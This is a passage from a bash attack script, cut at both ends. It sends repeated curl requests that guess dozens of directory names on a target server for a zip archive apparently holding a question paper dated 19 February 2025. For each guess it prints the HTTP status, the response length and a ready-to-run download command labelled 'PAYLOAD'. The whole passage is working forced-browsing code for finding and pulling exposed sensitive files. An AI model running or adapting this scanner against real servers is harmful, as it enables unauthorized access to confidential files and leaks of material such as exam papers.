${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPAutoTool/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [Manager_QPBatch/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}Manager_QPBatch/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}Manager_QPBatch/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [HandlingQPMaster/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}HandlingQPMaster/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}HandlingQPMaster/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [DataSync_QsnPaper/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}DataSync_QsnPaper/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}DataSync_QsnPaper/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPaperDocSync/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPaperDocSync/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPaperDocSync/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [TestPaper-Uploader/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}TestPaper-Uploader/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}TestPaper-Uploader/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPControl-Monitoring/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPControl-Monitoring/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPControl-Monitoring/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [Control_QPUpload/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}Control_QPUpload/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}Control_QPUpload/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [Management-QPWorkflow/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}Management-QPWorkflow/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}Management-QPWorkflow/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [Q_P_DataPipeline/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}Q_P_DataPipeline/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}Q_P_DataPipeline/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [FileProcessor_QPBData/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}FileProcessor_QPBData/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}FileProcessor_QPBData/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPUploaderDataProcessing/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPUploaderDataProcessing/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPUploaderDataProcessing/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [DataProcessing-QPFile/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}DataProcessing-QPFile/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}DataProcessing-QPFile/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QstnPaper-Sync/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QstnPaper-Sync/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QstnPaper-Sync/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPUpload_AutoUpload/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPUpload_AutoUpload/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPUpload_AutoUpload/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPCloudBatchProcessor/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPCloudBatchProcessor/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPCloudBatchProcessor/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [Handler-QPBFile/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}Handler-QPBFile/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}Handler-QPBFile/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QuestionPaper-DataProcessing/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QuestionPaper-DataProcessing/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QuestionPaper-DataProcessing/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [Automation_QsnPaper/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}Automation_QsnPaper/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}Automation_QsnPaper/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [System-TestPaper/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}System-TestPaper/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}System-TestPaper/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPBatch_AutomationSystem/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPBatch_AutomationSystem/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPBatch_AutomationSystem/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPProcessingHandling/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPProcessingHandling/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPProcessingHandling/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPaper-AutomationSystem/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPaper-AutomationSystem/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPaper-AutomationSystem/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPUpload_BatchProcessor/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPUpload_BatchProcessor/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPUpload_BatchProcessor/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [Monitoring-QPHandler/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}Monitoring-QPHandler/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}Monitoring-QPHandler/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPBMonitoring/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPBMonitoring/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPBMonitoring/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [ManagementQPControl/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}ManagementQPControl/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}ManagementQPControl/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPBulkDataPipeline/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPBulkDataPipeline/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPBulkDataPipeline/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QP-DataUpload/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QP-DataUpload/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QP-DataUpload/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPMonitorProcessingSystem/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPMonitorProcessingSystem/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPMonitorProcessingSystem/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPBulk_BatchProcessor/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPBulk_BatchProcessor/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPBulk_BatchProcessor/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [DataProcessing_QPUploader/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}DataProcessing_QPUploader/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}DataProcessing_QPUploader/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [ServiceQPaperDoc/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}ServiceQPaperDoc/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}ServiceQPaperDoc/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPMaster_MassUpload/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPMaster_MassUpload/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPMaster_MassUpload/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [Ops-Q_P/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}Ops-Q_P/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}Ops-Q_P/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPControlPortal/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPControlPortal/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPControlPortal/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [AccessControl_QPUploader/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}AccessControl_QPUploader/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}AccessControl_QPUploader/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [DataOpsQPBFile/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}DataOpsQPBFile/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}DataOpsQPBFile/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPAuto-DataProcessing/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPAuto-DataProcessing/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPAuto-DataProcessing/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QP_Module/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
